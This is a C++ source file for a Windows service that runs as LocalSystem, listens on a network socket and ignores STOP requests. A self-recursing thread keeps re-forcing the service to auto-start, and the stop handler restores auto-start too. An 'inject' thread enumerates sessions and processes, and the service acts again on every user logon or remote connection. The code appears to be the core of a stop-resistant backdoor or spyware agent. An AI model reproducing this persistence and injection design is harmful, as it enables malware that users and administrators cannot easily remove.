#include "Header.h"

void addLogMessage(const TCHAR* a)
{
	HANDLE log = RegisterEventSource(NULL, DISPLAY_NAME);
	if (log)
	{
		ReportEvent(log, EVENTLOG_INFORMATION_TYPE, 0, 0, NULL, 1, 0, &a, NULL);
		DeregisterEventSource(log);
	};
}

void CleanUp()
{
	SetEvent(stopEvent);
	
	if (listen_socket != INVALID_SOCKET)
	{
		shutdown(listen_socket, SD_BOTH);
		closesocket(listen_socket);
	};
	WSACleanup();

	Sleep(1000);
}

//void ControlHandler(DWORD request)
//{
//	if (request == SERVICE_CONTROL_STOP || request == SERVICE_CONTROL_SHUTDOWN)
//	{
//		addLogMessage(request == SERVICE_CONTROL_STOP ? _T("Stopped.\n") : _T("Shutdown.\n"));
//
//		CleanUp();
//		serviceStatus.dwWin32ExitCode = 0;
//		serviceStatus.dwCurrentState = SERVICE_STOPPED;
//		SetServiceStatus(serviceStatusHandle, &serviceStatus);
//	}
//}

void SetServiceStartup()
{
	SC_HANDLE sc = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!sc)
		return;

	SC_HANDLE serv = OpenService(sc, SERVICE_NAME, SERVICE_ALL_ACCESS);
	if (!serv)
	{
		CloseServiceHandle(sc);
		return;
	}

	LPWSTR dir = GetHomeDirectory();
	wstring cmdLine = L"\"" + wstring(dir) + L"\\" + SERVICE_NAME + L".exe\"";
	delete[] dir;

	ChangeServiceConfig(serv, SERVICE_NO_CHANGE, SERVICE_AUTO_START, SERVICE_NO_CHANGE, cmdLine.data(), NULL, NULL, NULL, L"LocalSystem", NULL, NULL);

	CloseServiceHandle(serv);
	CloseServiceHandle(sc);
}

void VerifyServiceStartup()
{
	if (WaitForSingleObject(stopEvent, 0) == WAIT_OBJECT_0)
		return;

	SetServiceStartup();
	Sleep(500);
	VerifyServiceStartup();
}

void ControlHandlerEx(DWORD request, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext)
{
	if (request == SERVICE_CONTROL_STOP || request == SERVICE_CONTROL_SHUTDOWN)
	{
		addLogMessage(request == SERVICE_CONTROL_STOP ? _T("Stopped.\n") : _T("Shutdown.\n"));

		CleanUp();

		SetServiceStartup();

		serviceStatus.dwWin32ExitCode = 0;
		serviceStatus.dwCurrentState = SERVICE_STOPPED;
		SetServiceStatus(serviceStatusHandle, &serviceStatus);
	}
	else if (request == SERVICE_CONTROL_SESSIONCHANGE && (dwEventType == WTS_SESSION_LOGON || dwEventType == WTS_CONSOLE_CONNECT || dwEventType == WTS_REMOTE_CONNECT))
	{
		HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)EnumProcesses, &((WTSSESSION_NOTIFICATION*)lpEventData)->dwSessionId, 0, NULL);
		if (hThread)
			CloseHandle(hThread);
	}
}

void InitService()
{
	listen_socket = INVALID_SOCKET;
	stopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
}

BOOL VerifyCurrentUser()
{
	HANDLE token = NULL;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &token))
		return FALSE;

	DWORD dwSize = 0;
	GetTokenInformation(token, TokenUser, NULL, dwSize, &dwSize);
	if (!dwSize)
	{
		CloseHandle(token);
		return FALSE;
	}

	PTOKEN_USER pUserInfo = (PTOKEN_USER)malloc(dwSize);
	if (!pUserInfo)
	{
		CloseHandle(token);
		return FALSE;
	}

	if (!GetTokenInformation(token, TokenUser, pUserInfo, dwSize, &dwSize))
	{
		free(pUserInfo);
		CloseHandle(token);
		return FALSE;
	}

	dwSize = 0;
	CreateWellKnownSid(WinLocalSystemSid, NULL, NULL, &dwSize);
	if (!dwSize)
	{
		free(pUserInfo);
		CloseHandle(token);
		return FALSE;
	}

	PSID pSID = malloc(dwSize);
	if (!pSID)
	{
		free(pUserInfo);
		CloseHandle(token);
		return FALSE;
	}

	if (!CreateWellKnownSid(WinLocalSystemSid, NULL, pSID, &dwSize))
	{
		free(pSID);
		free(pUserInfo);
		CloseHandle(token);
		return FALSE;
	}

	BOOL bRes = EqualSid(pSID, pUserInfo->User.Sid);

	free(pSID);
	free(pUserInfo);
	CloseHandle(token);
	return bRes;
}

void ServiceMain(DWORD dwNumServicesArgs, LPTSTR* lpServiceArgVectors)
{
	serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	serviceStatus.dwCurrentState = SERVICE_START_PENDING;
	serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_SHUTDOWN;
	serviceStatus.dwWin32ExitCode = 0;
	serviceStatus.dwServiceSpecificExitCode = 0;
	serviceStatus.dwCheckPoint = 0;
	serviceStatus.dwWaitHint = 0;

	serviceStatusHandle = RegisterServiceCtrlHandlerEx(SERVICE_NAME, (LPHANDLER_FUNCTION_EX)ControlHandlerEx, NULL);
	if (serviceStatusHandle == (SERVICE_STATUS_HANDLE)0) 
		return;

	InitService();
	serviceStatus.dwCurrentState = SERVICE_RUNNING;
	SetServiceStatus(serviceStatusHandle, &serviceStatus);

	if (!VerifyCurrentUser())
	{
		addLogMessage(L"This service should be run under local system account!");
		CloseHandle(stopEvent);
		ExitProcess(0);
	}

	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Listen, dwNumServicesArgs > 1 ? lpServiceArgVectors[1] : NULL, 0, NULL);

	HANDLE hVerifyThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)VerifyServiceStartup, NULL, 0, NULL);
	if (hVerifyThread)
		CloseHandle(hVerifyThread);

	HANDLE hInjectThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)EnumSessionsAndProcesses, NULL, 0, NULL);
	if (hInjectThread)
		CloseHandle(hInjectThread);

	if (hThread)
	{
		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);
	}
	else
		addLogMessage(_T("Can't create thread\n"));

	CloseHandle(stopEvent);
}

int _tmain(int argc, TCHAR* argv[])
{
	SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);

#ifdef _DEBUG

	Listen();

#else

	SERVICE_TABLE_ENTRY ServiceTable[] =
	{
		{ SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
		{ NULL, NULL }
	};
	if (!StartServiceCtrlDispatcher(ServiceTable))
		addLogMessage(_T("Error: StartServiceCtrlDispatcher\n\0"));

#endif

	return 0;
}